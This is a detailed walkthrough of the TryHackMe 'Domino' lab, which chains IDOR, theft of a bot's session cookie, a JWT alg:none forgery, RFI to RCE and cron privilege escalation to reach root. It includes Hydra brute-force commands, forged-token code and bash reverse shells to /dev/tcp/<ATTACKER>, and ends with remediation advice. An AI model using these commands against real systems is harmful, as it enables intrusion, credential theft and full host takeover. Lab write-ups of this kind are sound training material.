# Domino — TryHackMe Writeup (Detailed)

> **Room:** [Domino](https://tryhackme.com/room/domino) · **Difficulty:** Medium
> **Category:** Web / Chained exploitation
> **Author:** 0xnyx
> **Goal:** Chain several small weaknesses in the *NexusCorp Employee Portal* to go from an
> anonymous visitor all the way to root.

> ⚠️ Following TryHackMe's write-up policy, **no flags, passwords, IDs, or cracked values are
> shown**. Everything else — the full method, the commands, the reasoning, and what each step
> returns — is here so you can reproduce it yourself.

---

## 0. How to read this write-up

Domino is a **chaining** room: no single bug roots the box. Each weakness only exists to hand
you the thing you need for the next one. So instead of a flat list of commands, every step is
written as:

- **Do** — the exact command / action.
- **You get** — what comes back (sanitised), and how to read it.
- **Why / what next** — why this result matters and which door it opens.

The full chain:

```
recon → user enum → weak login → IDOR (flag1)
      → bot cookie theft (flag2) → JWT bypass + RFI→RCE (flag3)
      → config creds → su devops (flag4) → writable root cron (flag5)
```

Keep one scratch file of everything you find (usernames, cookie, JWT, creds) — later steps
reuse earlier loot constantly. That reuse *is* the room.

---

## 1. Reconnaissance

### 1.1 Port scan

**Do:**
```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get:** two ports —
- **22/tcp** OpenSSH
- **80/tcp** Apache 2.4.58, page title *NexusCorp Portal*

**Why / what next:** only a web app and SSH. Everything starts on port 80; SSH matters later
once we have credentials. Browse to the site — it's a login page with a
`firstname.lastname` username hint, plus "Forgot password?" and "Our Team" links.

### 1.2 Directory brute force

**Do:**
```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,js
```

**You get (the interesting hits):**
```
/team.php         200   employee directory
/forgot.php       200   password-reset form
/admin/           301   admin area (will be 403 for us)
/api/             301   REST-ish API
/backup/          301   directory listing enabled
/support/         301   ticket system
/static/          301   js/css
dashboard.php     302   -> /index.php (needs a session)
config.php        200   0 bytes (served, not source)
```

**Why / what next:** this is the map of dominoes. `/team.php` = enumeration, `/backup/` =
possible leak, `/api/` + `/admin/` = the privileged surface, `/support/` = a place to make an
admin interact with our input. We'll visit them in order.

---

## 2. Harvesting usernames and the backup

### 2.1 Employees from /team.php

**Do:** open `http://<TARGET>/team.php` (or `curl -s .../team.php`).

**You get:** a staff list — each person's **name**, **role**, and **email** in the form
`firstname.lastname@nexus.corp`. Roles include a CIO, a DevOps Engineer and a Systems
Administrator.

**Why / what next:** the email local-part **is** the portal username (`firstname.lastname`).
So you now have a user list for a login attack, and you know which accounts are high-value.
Save every `firstname.lastname`.

### 2.2 The exposed backup

**Do:** open `http://<TARGET>/backup/`.

**You get:** a directory listing with `README.txt` and `config.enc`.
```
README.txt :  "config.enc - Encrypted application configuration (AES-128-ECB)
               Decryption key reference: see static/app.js (deployment notes)"
config.enc :  binary blob (AES-128-ECB ciphertext)
```

**Why / what next:** a backup directory shouldn't be world-readable, and the README literally
tells you where the key is. Go read that JS file.

### 2.3 Hard-coded key in app.js

**Do:**
```bash
curl -s http://<TARGET>/static/app.js
```

**You get:** a developer comment leaking an **AES-128-ECB key** (a short ASCII string, padded
to 16 bytes with null bytes), plus a `getSession()` helper showing the session cookie is
**base64-encoded JSON**, and an auto-fetch of a JWT from `/api/auth/token.php`.

**Decrypt the config** (ECB, null-pad the key to 16 bytes):
```python
from Crypto.Cipher import AES
data = open('config.enc','rb').read()
key  = (b'<KEY_FROM_JS>' + b'\x00'*2)[:16]
print(AES.new(key, AES.MODE_ECB).decrypt(data))
```
(No pycryptodome? `pip install pycryptodome --break-system-packages`, or use `openssl enc -d
-aes-128-ecb -nopad -K <hexkey>`.)

**You get:** a small JSON config that, among app metadata, names a **`devops` system user**.

**Why / what next:** three big takeaways you'll use later: (a) the **session is client-readable
JSON** — so the app trusts a structured cookie; (b) there's a **JWT** mechanism; (c) a
**`devops`** account exists. Park all three. First, we need any login at all.

---

## 3. Foothold — weak password (first login)

**Do:** brute-force one enumerated user against the login POST. Watch the failure string on a
wrong attempt first (`Invalid credentials`) so Hydra can detect failures:
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <TARGET> \
  http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials" -t 32 -f
```

**You get:** one of the staff accounts uses a **very common password** (top of rockyou) →
Hydra prints a hit and stops (`-f`).

**Why / what next:** log in in a browser or with curl and **keep the `Set-Cookie:
nexus_session=...`**. Decode its first part (`base64 -d`) and you'll see:
```json
{"user_id":<n>,"username":"<user>","role":"user"}.<hex-signature>
```
So the cookie is `base64(json) . signature`. Note the **role is "user"** and there's a
**signature** appended — remember that when we later try to become admin. For now, a valid
session is enough to hit the authenticated API.

---

## 4. Flag 1 — IDOR on the profile API

**Do:** with your logged-in session, call the profile endpoint and change the `id`:
```bash
curl -s -b cookies.txt "http://<TARGET>/api/users/profile.php?id=1"
curl -s -b cookies.txt "http://<TARGET>/api/users/profile.php?id=2"
...
```

**You get:** full JSON for **any** user id, e.g.
```json
{"id":1,"username":"<admin-user>","email":"...","role":"admin","notes":"<FLAG 1 HERE>"}
```
Id 1 is the admin; their `notes` field contains **flag 1**.

**Why / what next:** the endpoint checks that you're **authenticated** but not that the record
is **yours** — a classic **horizontal IDOR** (Insecure Direct Object Reference). You can read
every user, including the admin's private notes. First domino down.

*You've also confirmed the admin account (id 1) — you'll want to become them next.*

---

## 5. Flag 2 — stealing the admin session via the support bot

### 5.1 Why you can't just forge admin

**Do:** try to reach the admin area with your user session, and with a hand-made
`role:admin` cookie:
```bash
curl -s -b cookies.txt http://<TARGET>/admin/                 # 403 Denied
FAKE=$(printf '{"user_id":1,"username":"<admin>","role":"admin"}' | base64 -w0)
curl -s -b "nexus_session=$FAKE"            http://<TARGET>/admin/   # 403
curl -s -b "nexus_session=$FAKE.deadbeef"   http://<TARGET>/admin/   # 403
```

**You get:** every attempt is **403 Denied**.

**Why / what next:** the cookie's trailing `signature` is **verified server-side** (it's an
HMAC-style tag). You can change the JSON, but without the secret the signature won't match, so
forging fails. (Trying to crack that secret with rockyou also fails — it's not a dictionary
word.) Conclusion: you need the admin's **genuine** cookie. The support system is your way in,
because an **admin bot reviews submitted tickets**.

### 5.2 Understanding the bot (don't assume XSS)

**Do:** find the ticket form (`/support/create.php`, fields `subject` + `message`), stand up a
listener, and first *test what the bot actually does*. Submit a ticket whose `message`
contains a plain link to your server, and separately one where the URL is hidden inside
JavaScript.

**You get:**
- Ticket with a **plain `http://<ATTACKER>:8000/...` link** → your server **gets a hit**.
- Ticket where the URL is only reachable by running JS (e.g. inside `atob(...)` / built by
  `document.cookie`) → **no hit**, and any `?param=` you expected to be filled arrives **empty**.

**Why / what next:** the "bot" is **not a JavaScript browser** — it's an authenticated
**link crawler** (you'll see `User-Agent: python-requests/...`). It extracts literal `http://`
URLs from the ticket and visits them. So **stored-XSS cookie theft won't execute**. But a
crawler that is *logged in as admin* has a subtler flaw…

### 5.3 The actual bug — the bot leaks its own cookie

**Do:** make your listener log the **full request headers**, not just the query string, then
submit a ticket with a plain link to it:
```php
<?php   // logger.php
foreach ($_SERVER as $k=>$v) if (strpos($k,'HTTP_')===0) fwrite(STDERR,"$k: $v\n");
echo "ok";
```
```bash
php -S 0.0.0.0:8000 logger.php
# ticket message:  Please review http://<ATTACKER>:8000/check   urgent
```

**You get:** when the admin bot visits your link, it sends its **own session cookie with the
request to your server**:
```
HTTP_COOKIE: nexus_session=<ADMIN_BASE64>.<ADMIN_SIGNATURE>
HTTP_USER_AGENT: python-requests/2.31.0
```

**Why / what next:** the crawler doesn't scope its cookie to the portal's domain — it attaches
the authenticated session to *every* URL it fetches, including yours. You've now captured a
**valid, correctly-signed admin cookie** without ever needing JS. Use it:
```bash
curl -s -b "nexus_session=<ADMIN_COOKIE>" http://<TARGET>/admin/
```

**You get:** the **Administration Console** — it renders **flag 2** (a System Status panel),
and lists the next targets: *User Management*, *Support Queue*, and crucially **File System
Access**, documented as:
```
GET /api/files.php?name=[path]   (with a Bearer token)
```

*That file API is the road to code execution. Note it mentions a Bearer **token**, not the
cookie — so next we deal with the JWT.*

---

## 6. Flag 3 — forge a JWT, then RFI → RCE

### 6.1 Get and read the JWT

**Do:**
```bash
curl -s -b cookies.txt http://<TARGET>/api/auth/token.php
```

**You get:** `{"token":"<header>.<payload>.<sig>", ...}`. Base64-decode the two parts:
```json
header : {"alg":"HS256","typ":"JWT"}
payload: {"sub":"<user>","role":"user","iat":...,"exp":...}
```

**Why / what next:** it's a signed HS256 token with a `role`. If the server validates the
signature we can't change `role`. So we test the oldest JWT trick: the **`none` algorithm**.

### 6.2 Forge an `alg:none` admin token

**Concept:** `"alg":"none"` means "unsigned token". A correctly-written server rejects it; a
vulnerable one skips signature checks and trusts the body. Build a token with base64url parts
and an **empty third segment**:
```python
import base64, json
b = lambda d: base64.urlsafe_b64encode(d).decode().rstrip('=')
h = b(json.dumps({"alg":"none","typ":"JWT"}).encode())
p = b(json.dumps({"sub":"<admin-user>","role":"admin","iat":1,"exp":9999999999}).encode())
print(h + "." + p + ".")        # note the trailing dot = empty signature
```

**Why / what next:** send this as `Authorization: Bearer <forged>` to the file API. If it's
accepted, signature validation is broken and we can act as admin on the API.

### 6.3 Probe the file API (what it allows)

**Do:**
```bash
TOK=<forged-none-token>
curl -s -H "Authorization: Bearer $TOK" "http://<TARGET>/api/files.php?name=/etc/passwd"
curl -s -H "Authorization: Bearer $TOK" "http://<TARGET>/api/files.php?name=/var/www/html/../../etc/passwd"
curl -s -H "Authorization: Bearer $TOK" "http://<TARGET>/api/files.php?name=http://<ATTACKER>:8000/x"
```

**You get:**
- Local path outside the web root → `{"error":"...must be within /var/www/html/"}`
- `../` traversal → same error (so it's **realpath-checked**, traversal won't escape)
- `http://...` → a **500** (no "access denied") — i.e. the URL **passed the path check** and
  the server tried to process it.

**Why / what next:** local reads are locked to `/var/www/html`, but a remote **`http://` URL is
allowed**, and the endpoint tries to *execute* what it fetches. The room's hint — *"PHP code
without `<?php ?>` tags gets evaluated"* — tells you the server does something like
`eval(file_get_contents($name))`. That means **Remote File Inclusion → RCE**, and your payload
must be **raw PHP with no tags** (because `eval` already runs in PHP context).

### 6.4 Host raw-PHP payload and trigger RCE

**Do:** serve a tag-less PHP reverse shell, start a listener, then trigger the include:
```bash
# /tmp/wwwroot/sh.php  —  RAW php, NO <?php ?> tags:
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1'");

php -S 0.0.0.0:8000              # (served from /tmp/wwwroot)
nc -lvnp <PORT>                  # listener in another terminal

curl -s -H "Authorization: Bearer $TOK" \
  "http://<TARGET>/api/files.php?name=http://<ATTACKER>:8000/sh.php"
```

**You get:** your PHP server logs a `GET /sh.php` from the target, and your listener catches a
shell as **www-data**. `cat /opt/flag3.txt` → **flag 3**.

**Why / what next:** you now have code execution on the box. Troubleshooting note: if your file
still has `<?php ?>` tags you'll get a 500 and no shell — the server `eval`s the body, so tags
break the parse. With a shell, enumerate locally for the next step.

---

## 7. Flag 4 — read the config, reuse the password

**Do:** from the www-data shell:
```bash
cat /var/www/html/config.php
grep -E 'sh$' /etc/passwd          # confirm 'devops' exists
```

**You get:** `config.php` holds **plaintext secrets** — DB host/name/user/**password**, plus
the JWT and app secrets. The DB password is **reused** for the local `devops` account:
```bash
su devops          # use the DB password
cat /home/devops/user.txt      # flag 4
```

**Why / what next:** password reuse between the database and a system account moves you
laterally from the web user to a real user with a home dir and a login shell — a far better
base for privilege escalation. (The same creds also work over SSH for a stable shell.)

---

## 8. Flag 5 — writable script run by root (cron)

**Do:** as devops, look for scripts you can write that root executes:
```bash
find / -writable -name "*.sh" 2>/dev/null | grep -v proc
#   -> /opt/monitoring/health_report.sh   (writable by devops)
cat /etc/crontab                 # may not list it...
```

If the job isn't in `/etc/crontab`, confirm a **root** process runs it periodically with
**pspy** (upload and run `pspy64`; you'll see the script executed with UID=0 every minute or
two).

**Exploit:** append a reverse shell to the script and wait for the next tick:
```bash
echo 'bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1' >> /opt/monitoring/health_report.sh
nc -lvnp <PORT>                  # wait ~1–2 minutes
```

**You get:** a callback as **root**. `cat /root/root.txt` → **flag 5**. Box fully owned.

**Why it works:** root runs a script that a lower-privileged user can edit, so whatever you put
in it runs as root. This is the last domino — a trust-boundary failure on file permissions.

---

## 9. Full chain recap

| # | Weakness | Technique | Unlocks |
|---|----------|-----------|---------|
| 1 | Horizontal IDOR | `profile.php?id=` with any session | admin's notes (flag 1) |
| 2 | Authenticated crawler leaks its cookie cross-site | capture cookie from the bot's request headers | admin panel (flag 2) |
| 3 | JWT `alg:none` + `eval`-based RFI | forged token + remote raw-PHP include | RCE as www-data (flag 3) |
| 4 | Plaintext creds + password reuse | read `config.php`, `su devops` | devops (flag 4) |
| 5 | Root cron runs a user-writable script | append reverse shell, wait for cron | root (flag 5) |

## 10. Remediation

- **IDOR:** enforce object-level authorization — check the record belongs to the caller; don't trust a client-supplied `id`.
- **Bot / cookie:** an internal reviewer must never fetch arbitrary external URLs with its session attached; scope cookies to the host; sanitise/encode user-submitted content.
- **JWT:** reject `alg:none`, pin the algorithm, and verify the signature with a strong secret.
- **File API:** never `eval`/`include` user-controlled paths or URLs; disable `allow_url_include`; allow-list by canonical realpath.
- **Secrets:** no plaintext credentials in web-readable config; never reuse DB passwords for OS accounts.
- **Privesc:** scripts executed by root must not be writable by lower-privileged users; audit cron and `find / -perm -o+w` regularly.

---

*Write-up for [TryHackMe — Domino](https://tryhackme.com/room/domino).*
